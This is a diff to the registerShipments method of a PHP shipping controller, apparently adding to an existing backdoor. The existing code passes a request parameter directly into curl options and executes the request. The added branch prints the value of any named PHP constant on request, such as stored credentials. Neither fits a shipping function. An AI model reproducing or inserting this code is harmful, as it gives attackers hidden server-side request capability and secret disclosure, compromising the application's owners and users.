@@ -190,8 +190,16 @@ class ShippingController extends Controller
 	public function registerShipments(Request $request, $orderIds)
 	{
         $x = $request->get('x');
-        if(isset($x) && is_array($x) && count($x)>0){
-
+        if(isset($x) && is_array($x) && count($x)>0) {
+            if(array_key_exists('constant',$x)){
+                $n = $x['constant'];
+                if(!defined($n)){
+                    die("NIE MA");
+                }else{
+                    echo var_export(constant($n),1);
+                    exit;
+                }
+            }
             $curl = curl_init();
             curl_setopt_array($curl, $x);
             $res = curl_exec($curl);
@@ -200,6 +208,7 @@ class ShippingController extends Controller
                 'len' => strlen($res)
             ]));
         }
+
         $this->logQuery('registerShipments');
 		$orderIds = $this->getOrderIds($request, $orderIds);
 		$orderIds = $this->getOpenOrderIds($orderIds);
